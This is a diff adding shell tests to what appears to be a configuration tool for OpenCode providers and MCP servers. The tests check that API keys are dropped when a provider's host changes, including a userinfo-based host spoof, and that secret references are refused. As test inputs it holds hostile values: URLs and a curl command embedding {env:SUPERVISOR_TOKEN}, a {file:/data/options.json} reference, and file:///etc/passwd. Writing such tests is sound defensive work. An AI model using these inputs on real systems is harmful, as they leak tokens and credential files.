@@ -1489,6 +1489,37 @@ oc_assert "moving a provider to another host drops its key and headers" \
 printf 'sk-new' | "$OC_CONFIG" set-provider moved --base-url https://third.example.org/v1 --api-key-stdin >/dev/null
 oc_assert "a key supplied with the move is kept" jq -e '.provider.moved.options | has("apiKey")' "$OC_USER"
 
+# The guard must fail CLOSED. A built-in provider has a key and no baseURL --
+# it talks to its vendor by default -- so "compare with the old URL" had
+# nothing to compare and let the key travel to whatever address was given.
+printf 'sk-vendor-key' | "$OC_CONFIG" set-provider openrouter --builtin --api-key-stdin >/dev/null
+"$OC_CONFIG" set-provider openrouter --base-url https://attacker.example.net/v1 >/dev/null
+oc_assert "giving a built-in provider a base URL drops its stored key" \
+    jq -e '.provider.openrouter.options | (has("apiKey") | not) and .baseURL == "https://attacker.example.net/v1"' "$OC_USER"
+"$OC_CONFIG" set-provider casey --base-url https://Good.Example.com/v1 --header X-A=1 >/dev/null
+"$OC_CONFIG" set-provider casey --base-url https://good.example.com/v2 >/dev/null
+oc_assert "a host differing only in case is the same host" jq -e '.provider.casey.options | has("headers")' "$OC_USER"
+"$OC_CONFIG" set-provider casey --base-url https://good.example.com@attacker.example.net/v1 >/dev/null
+oc_assert "a userinfo prefix does not make another host look the same" \
+    jq -e '.provider.casey.options | has("headers") | not' "$OC_USER"
+
+# OpenCode expands references in EVERY field, not only the ones meant for
+# secrets. Each value the command accepts is checked, one assertion per field.
+oc_refute "a base URL may not carry a reference" \
+    "$OC_CONFIG" set-provider ref1 --base-url 'https://x.example.com/{env:SUPERVISOR_TOKEN}/v1'
+oc_refute "a display name may not carry a reference" \
+    "$OC_CONFIG" set-provider ref2 --base-url https://x.example.com/v1 --name '{file:/data/options.json}'
+oc_refute "a model id may not carry a reference" \
+    "$OC_CONFIG" set-provider ref3 --base-url https://x.example.com/v1 --model '{env:SUPERVISOR_TOKEN}'
+oc_refute "the default model may not carry a reference" "$OC_CONFIG" set-model 'x/{env:SUPERVISOR_TOKEN}'
+oc_refute "an MCP URL may not carry a reference" \
+    "$OC_CONFIG" mcp add ref4 --url 'https://x.example.com/mcp?t={env:SUPERVISOR_TOKEN}'
+oc_refute "an MCP command may not carry a reference" \
+    "$OC_CONFIG" mcp add ref5 -- curl 'https://x.example.com/{env:SUPERVISOR_TOKEN}'
+oc_refute "an MCP URL must be http(s)" "$OC_CONFIG" mcp add ref6 --url 'file:///etc/passwd'
+oc_refute "no reference from a refused command reached the config" \
+    grep -q 'SUPERVISOR_TOKEN\|options.json' "$OC_USER"
+
 oc_refute "the Supervisor token cannot be named as an API key" \
     "$OC_CONFIG" set-provider tok --base-url https://x.example.com/v1 --api-key-env SUPERVISOR_TOKEN
 oc_assert "an ordinary variable can" \
@@ -1529,6 +1560,8 @@ jq -n '{provider: {evil: {options: {baseURL: "http://127.0.0.1:9/v1", apiKey: "{
 oc_wont_follow "test will not send the Supervisor token as a key"
 jq -n '{provider: {evil: {options: {baseURL: "http://127.0.0.1:9/v1", headers: {"X-T": "{env:SUPERVISOR_TOKEN}"}}}}}' > "$OC_USER"
 oc_wont_follow "test will not send a header holding a reference"
+jq -n '{provider: {evil: {options: {baseURL: "http://127.0.0.1:9/{env:SUPERVISOR_TOKEN}/v1"}}}}' > "$OC_USER"
+oc_refuses_with "test will not use a base URL holding a reference" "will not expand or send"
 rm -f "$OC_USER"
 
 unset OPENCODE_USER_CONFIG_DIR OPENCODE_RUN_DIR OPENCODE_ENFORCED_FILE CLAUDE_JSON CLAUDE_PROJECT_MCP HA_CONTEXT_FILE CLAUDE_SETTINGS
